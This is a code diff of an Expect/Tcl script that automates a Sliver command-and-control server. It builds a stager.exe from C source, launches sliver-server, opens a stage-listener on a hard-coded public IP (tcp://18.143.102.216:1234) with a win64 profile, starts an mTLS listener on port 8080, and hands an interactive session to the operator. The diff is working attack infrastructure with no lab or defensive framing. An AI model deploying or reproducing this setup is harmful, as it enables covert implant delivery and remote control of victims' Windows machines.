@@ -13,14 +13,18 @@ puts "Waiting for converting stager.c to stager.exe"
 exec ./tools/sliver/exe_from_c.sh
 puts "Default stager.exe create successfully saving at $path!"
 
-# # Ativate Sliver server
-# spawn sliver-server
+# Ativate Sliver server
+spawn sliver-server
 
-# # Wait for sliver-server to start (you can adjust the sleep duration as needed)
-# sleep 0.1
+# Wait for sliver-server to start (you can adjust the sleep duration as needed)
+sleep 0.1
 
-# # Continue using sliver-server
-# send "multiplayer\r"
-# send "operators\r"
-# send "jobs\r"
-# send "profiles\r"
+# Continue using sliver-server
+send "multiplayer\r"
+send "operators\r"
+send "profiles\r"
+send "stage-listener --url tcp://18.143.102.216:1234 --profile win64\r"
+send "mtls -l 8080"
+send "jobs\r"
+
+interact
